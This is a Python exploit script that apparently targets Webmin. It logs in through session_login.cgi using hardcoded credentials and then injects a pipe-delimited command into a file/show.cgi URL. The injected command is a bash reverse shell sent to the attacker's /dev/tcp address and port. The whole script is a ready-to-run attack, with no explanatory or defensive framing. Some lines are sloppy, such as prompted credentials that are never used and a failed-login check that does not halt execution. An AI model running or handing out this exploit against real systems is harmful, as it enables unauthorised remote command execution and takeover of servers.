import requests
import string
import secrets

targetIp = input("please Enter The Target IP: ").strip()
targetPort = int(input("Enter The Target Port Number: "))
username = input("Enter The Username: ").split()
password = input("Enter The Password: ").split()
lhost = input('Enter Your IP: ')
lport = input('Please Enter The Port To Listen On')
payload = f"bash -c 'exec bash -i &>/dev/tcp/{lhost}/{lport}<&1'"
data = {'page': '%2f', 'user': 'user1', 'pass': '1user'}
url = 'http://' + str(targetIp) + '/session_login.cgi'
response = requests.post(url, data=data, cookies={"testing": "1"}, verify=False, allow_redirects=False)
if response.status_code == 302 and response.cookies["sid"] != None:
    print('[+] Login Successful, Trying To Execute The Payload')
else:
    print('[-] Login Faild')


cookies = response.cookies['sid']
setCookies = response.headers['Set-Cookie'].replace('\n', '').split('=')[1].split(';')[0].strip()
sessionId = response.headers['Set-Cookie'].split('=')[1].split(';')[0].strip()
sid = cookies.strip('/=; ')
def rand():
    alphaNum = string.ascii_letters + string.digits
    randChar = ''.join(secrets.choice(alphaNum) for i in range(5))
    return randChar
exp = f"http://{targetIp}:{targetPort}/file/show.cgi/bin/{rand()}|{payload}|"

requestWithPayload = requests.post(exp, cookies={'sid': sid}, verify=False, allow_redirects=False)

